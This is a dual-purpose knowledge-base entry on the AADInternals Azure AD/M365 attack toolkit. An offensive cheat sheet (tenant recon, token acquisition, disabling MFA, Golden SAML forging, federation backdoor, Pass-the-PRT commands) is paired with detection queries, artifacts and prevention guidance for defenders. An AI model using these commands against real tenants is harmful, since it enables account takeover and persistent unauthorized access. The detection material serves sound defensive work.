name: AADInternals - Azure AD / M365 Attack Toolkit
description: AADInternals is a PowerShell module for administering, enumerating, and attacking Azure AD (Entra ID) and Microsoft 365. It covers reconnaissance against tenants, access-token acquisition for many resources, credential and MFA inspection, Pass-the-PRT, Golden SAML / immutableID abuse, DesktopSSO/Seamless-SSO abuse, and backdoor federation. The single most comprehensive offensive Entra ID toolkit.
notes:
=== INSTALL ===
  Install-Module AADInternals -Scope CurrentUser
  Import-Module AADInternals

=== UNAUTHENTICATED RECON (just a domain) ===
  Get-AADIntLoginInformation -Domain <domain>        # is the tenant managed or federated
  Invoke-AADIntReconAsOutsider -DomainName <domain>  # tenant id, domains, MDI/DesktopSSO status
  Get-AADIntTenantID -Domain <domain>

=== GET ACCESS TOKENS (many resources) ===
  $cred = Get-Credential
  Get-AADIntAccessTokenForAADGraph -Credentials $cred -SaveToCache
  Get-AADIntAccessTokenForMSGraph -SaveToCache
  Get-AADIntAccessTokenForEXO -SaveToCache          # Exchange Online
  Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
  # also supports device-code, PRT, BPRT, and refresh-token flows

=== AUTHENTICATED RECON ===
  Invoke-AADIntReconAsInsider        # roles, users, devices, sync config
  Get-AADIntGlobalAdmins
  Get-AADIntSyncConfiguration        # AAD Connect / sync account details

=== CREDENTIAL + MFA ABUSE ===
  Get-AADIntUsersPasswordPolicy
  Set-AADIntUserMFA -UserPrincipalName <user> -State Disabled   # if privileged

=== GOLDEN SAML / IMMUTABLEID (needs token-signing cert) ===
  # export ADFS token-signing cert with Export-AADIntADFSSigningCertificate on the ADFS box,
  # then forge: New-AADIntSAMLToken / Open-AADIntOffice365Portal
  ConvertTo-AADIntBackdoor -Domain <domain>          # federation backdoor (AnyPurpose)

=== PASS-THE-PRT ===
  # from a joined host: Get-AADIntUserPRTToken  then  Get-AADIntAccessTokenForAADGraph -PRTToken ...

=== ALTERNATIVES ===
  ROADtools/roadrecon   # offline Entra enumeration
  AzureHound            # BloodHound graph
  TokenTactics          # token manipulation only
  GraphRunner           # post-compromise Graph toolkit

recommended.note: ROADrecon for offline Entra graph enumeration.

defense.why_it_works: AADInternals uses documented Azure AD / M365 APIs and public token endpoints. Many recon calls are unauthenticated (tenant metadata is public), and token acquisition uses legitimate OAuth ROPC/device-code flows, so activity resembles normal client sign-ins unless federation/sync internals are touched.
defense.prerequisites: Unauthenticated: only a domain name. Authenticated actions: valid credentials or a token/PRT. Golden SAML: the ADFS token-signing certificate. Federation backdoor: Global Admin or sync-account rights.
defense.impact: Full tenant reconnaissance, token theft across resources, MFA tampering, persistent federation backdoors, and forged SAML tokens granting access as any user.
defense.detection: [MITRE T1078.004] Entra sign-in logs showing ROPC (password) or device-code grants from unusual clients/IPs; AADInternals default client IDs (e.g. 1b730954-... AAD Graph PowerShell); federation/domain changes (Set-DomainAuthentication) in the audit log; new or modified token-signing certs on ADFS.
defense.artifacts: Entra sign-in logs (clientAppUsed, appDisplayName), Entra audit logs for 'Set domain authentication' / 'Set federation settings', ADFS event 307/510 on cert changes, unusual MSGraph/EXO token issuance.
defense.splunk_spl:
index=azure sourcetype=azure:aad:signin (authenticationProtocol=ropc OR authenticationProtocol=deviceCode)
| stats count by userPrincipalName, appDisplayName, ipAddress
| where count > 0
defense.elastic_kql: azure.signinlogs.properties.authentication_protocol:(ropc or deviceCode) or azure.auditlogs.operation_name:"Set domain authentication"
defense.sentinel_kql:
SigninLogs
| where AuthenticationProtocol in ("ropc","deviceCode")
| summarize Count=count() by UserPrincipalName, AppDisplayName, IPAddress
| union (AuditLogs | where OperationName has "domain authentication" or OperationName has "federation")
defense.prevention: Block ROPC and restrict device-code flow via Conditional Access; require MFA and compliant devices; protect ADFS token-signing certs (HSM, limited access); alert on any federation/domain-authentication change; move off ADFS to cloud auth where possible; monitor sync-account usage.

detections.name: Entra ROPC/device-code sign-in from AADInternals-style client
detections.logic:
SigninLogs
| where AuthenticationProtocol in ("ropc","deviceCode") or AppId in ("1b730954-1685-4b74-9bfd-dac224a7b894","1950a258-227b-4e31-a9cf-717495945fc2")
| summarize Count=count(), IPs=make_set(IPAddress) by UserPrincipalName, AppDisplayName, bin(TimeGenerated, 1h)
detections.false_positives: Legacy scripts using ROPC; admin PowerShell tooling
detections.tuning: Allowlist known automation identities and source IPs; alert on new UPN+client pairs

detections.name: Entra federation/domain authentication change (Golden SAML backdoor)
detections.logic:
AuditLogs
| where OperationName has "domain authentication" or OperationName has "federation settings"
| project TimeGenerated, InitiatedBy, OperationName, TargetResources
detections.tuning: Alert on any change outside a change window; require ticket correlation
